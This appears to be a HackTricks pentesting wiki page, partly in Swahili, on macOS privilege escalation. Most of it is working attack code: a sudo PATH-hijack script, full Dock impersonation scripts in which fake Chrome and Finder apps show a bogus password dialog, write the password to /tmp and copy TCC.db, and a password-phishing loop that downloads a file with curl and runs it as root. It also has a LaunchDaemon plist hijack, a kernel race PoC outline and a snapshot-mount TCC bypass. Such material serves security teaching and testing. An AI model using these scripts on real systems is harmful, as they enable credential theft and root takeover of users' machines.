# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Ikiwa umefika hapa ukitafuta TCC privilege escalation, nenda kwa:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Tafadhali kumbuka kwamba **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** mashine. Kwa hivyo angalia:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Mwingiliano wa Mtumiaji

### Sudo Hijacking

You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

However, macOS **maintains** the user's **`PATH`** when he executes **`sudo`**. Which means that another way to achieve this attack would be to **hijack other binaries** that the victim will execute when **running sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Kumbuka kwamba mtumiaji anayevumia terminali ana uwezekano mkubwa wa kuwa na **Homebrew imewekwa**. Hivyo inawezekana ku-hijack binaries katika **`/opt/homebrew/bin`**.

### Dock Impersonation

Kwa kutumia **social engineering** unaweza **impersonate, kwa mfano, Google Chrome** ndani ya Dock na kwa kweli execute script yako mwenyewe:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Mapendekezo:

- Angalia katika Dock kama kuna Chrome, na katika hali hiyo **remove** ile entry na **add** **fake** **Chrome entry in the same position** katika Dock array.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Mapendekezo kadhaa:

- Huwezi **kuondoa Finder kutoka Dock**, hivyo ikiwa unakusudia kuiweka katika Dock, unaweza kuweka Finder bandia karibu kabisa na ile halisi. Kwa hili unahitaji **kuongeza kipengele cha Finder bandia mwanzoni mwa array ya Dock**.
- Chaguo jingine ni kutokuiweka katika Dock na kuifungua tu; "Finder asking to control Finder" si jambo la ajabu sana.
- Njia nyingine za **kupanda hadhi hadi root bila kuuliza** nywila kwa sanduku mbaya, ni kufanya Finder kwa kweli aombe nywila ili kufanya kitendo chenye ruhusa:
- Ombia Finder kunakili hadi **`/etc/pam.d`** faili mpya ya **`sudo`** (The prompt asking for the password will indicate that "Finder wants to copy sudo")
- Ombia Finder kunakili **Authorization Plugin** mpya (Unaweza kudhibiti jina la faili ili sehemu inayouliza nywila itaonyesha kwamba "Finder wants to copy Finder.bundle")

<details>
<summary>Script ya kuiga Finder kwenye Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware mara nyingi hutumia mwingiliano wa mtumiaji ili **kunasa nenosiri linaloweza kutumika na sudo** na kulitumia tena kwa njia ya programu. Mtiririko wa kawaida:

1. Tambua mtumiaji aliyeko kwenye mfumo kwa kutumia `whoami`.
2. **Rudia kuonyesha maombi ya nenosiri** hadi `dscl . -authonly "$user" "$pw"` irudishe mafanikio.
3. Hifadhi cheti/kibali (kwa mfano, `/tmp/.pass`) na endesha vitendo vinavyohitaji ruhusa za juu kwa kutumia `sudo -S` (nenosiri kupitia stdin).

Mfano wa mnyororo mfupi:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Neno la siri lililoibwa linaweza kisha kutumika tena kwa **kuondoa karantini ya Gatekeeper kwa `xattr -c`**, kunakili LaunchDaemons au faili nyingine zenye ruhusa za juu, na kuendesha hatua za ziada bila mwingiliano.

## Njia mpya maalum za macOS (2023–2025)

### `AuthorizationExecuteWithPrivileges` iliyopitwa na matumizi bado inatumika

`AuthorizationExecuteWithPrivileges` ilifutwa matumizi katika 10.7 lakini **bado inafanya kazi kwenye Sonoma/Sequoia**. Waundaji wengi wa updaters wa kibiashara huita `/usr/libexec/security_authtrampoline` wakitumia njia isiyo ya kuaminika. Ikiwa binary lengwa ni user-writable unaweza kupandisha trojan na kuendesha prompt halali:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Yunganisha na **masquerading tricks above** ili kuonyesha dirisha la nenosiri linaloonekana halali.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Ikiwa LaunchDaemon plist au lengo lake la `ProgramArguments` ni **user-writable**, unaweza escalate kwa kubadilisha faili hiyo kisha kulazimisha launchd kupakia upya:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Hii inaakisi mtindo wa exploit uliotangazwa kwa **CVE-2025-24085**, ambapo writable plist ilitumiwa vibaya kutekeleza attacker code kama root.

### XNU SMR credential race (CVE-2025-24118)

A **race in `kauth_cred_proc_update`** inampa attacker wa ndani uwezo wa kuharibu read-only credential pointer (`proc_ro.p_ucred`) kwa kukimbizana kwa `setgid()`/`getgid()` loops kati ya threads hadi `memcpy` iliyovunjika itokee. Uharibifu uliofanikiwa hutoa **uid 0** na ufikiaji wa kernel memory. Muundo wa minimal PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Couple with heap grooming to land controlled data where the pointer re-reads. On vulnerable builds this is a reliable **local kernel privesc** without SIP bypass requirements.

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

Ikiwa tayari una root, SIP bado inalizuia uandishi kwa maeneo ya mfumo. Hitilafu **Migraine** inatumia entitlement ya Migration Assistant `com.apple.rootless.install.heritable` kuanzisha child process inayopokea urithi wa SIP bypass na kuandika juu ya protected paths (mfano, `/System/Library/LaunchDaemons`). Mfuatano:

1. Pata root kwenye mfumo unaoendesha.
2. Chochea `systemmigrationd` kwa crafted state ili kuendesha binary inayodhibitiwa na mshambuliaji.
3. Tumia entitlement iliyorithiwa kurekebisha faili zilizo protected na SIP, zikidumu hata baada ya reboot.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Daemons kadhaa za Apple zinakubali **NSPredicate** objects kupitia XPC na zinathibitisha tu field ya `expressionType`, ambayo iko chini ya udhibiti wa mshambuliaji. Kwa kutengeneza predicate inayotathmini selectors yoyote unaweza kupata **code execution in root/system XPC services** (mfano, `coreduetd`, `contextstored`). Ikitumika pamoja na initial app sandbox escape, hii inatoa **privilege escalation without user prompts**. Tafuta XPC endpoints zinazodeserialize predicates na ambazo hazina visitor thabiti.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user** (hata wale wasiokuwa na ruhusa) anaweza kuunda na mount Time Machine snapshot na **access ALL the files** za snapshot hiyo.  
Ruhusa pekee inayohitajika ni kwamba programu inayotumika (kama `Terminal`) iwe na **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) ambayo inapaswa kutolewa na admin.

<details>
<summary>Mount Time Machine snapshot</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Ufafanuzi wa kina unaweza [**kupatikana katika ripoti ya awali**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Taarifa Nyeti

Hii inaweza kusaidia kuinua vibali:

{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Marejeo

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
